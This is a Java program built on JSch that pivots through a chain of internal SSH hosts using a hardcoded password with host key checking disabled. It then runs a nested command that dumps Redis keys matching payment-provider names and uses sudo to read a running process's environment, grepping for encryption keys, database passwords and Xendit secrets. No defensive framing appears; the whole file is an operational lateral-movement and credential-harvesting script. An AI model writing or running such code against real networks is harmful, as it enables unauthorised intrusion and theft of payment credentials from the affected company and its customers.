import com.jcraft.jsch.*;
import java.io.*;
class DF7 {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session s1 = j.getSession("user", "10.14.36.23", 22);
    s1.setPassword("kutul0nc4t");
    s1.setConfig(p);
    s1.setTimeout(10000);
    s1.connect();
    int fwd1 = s1.setPortForwardingL(0, "10.13.16.117", 22);
    Session s2 = j.getSession("user", "127.0.0.1", fwd1);
    s2.setPassword("kutul0nc4t");
    s2.setConfig(p);
    s2.setTimeout(8000);
    s2.connect();
    ChannelExec ch = (ChannelExec) s2.openChannel("exec");
    // Connect to Redis and search for xnd_ keys  
    ch.setCommand("sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.132 'echo ---REDIS-INFO---;echo \"INFO server\" | curl -s telnet://10.13.16.156:6379 --max-time 3 2>/dev/null | head -5;echo ---REDIS-DBSIZE---;echo \"DBSIZE\" | curl -s telnet://10.13.16.156:6379 --max-time 3 2>/dev/null;echo ---REDIS-SCAN-XENDIT---;echo -e \"KEYS *xendit*\\r\\nKEYS *xnd_*\\r\\nKEYS *payment*\\r\\nKEYS *config*\" | curl -s telnet://10.13.16.156:6379 --max-time 3 2>/dev/null | head -30;echo ---SSH-VENUS---;sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 user@10.13.16.141 \"hostname;echo kutul0nc4t | sudo -S cat /proc/\\$(pgrep -f venus | head -1)/environ 2>/dev/null | tr \\\"\\\\0\\\" \\\"\\\\n\\\" | grep -iE \\\"VEN_ENC\\\\|ENC_\\\\|db\\\\.pass\\\\|xendit\\\\|xnd_\\\"\" 2>&1 | head -10' 2>&1 | head -50");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[16384];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    s2.disconnect();
    s1.disconnect();
  }
}
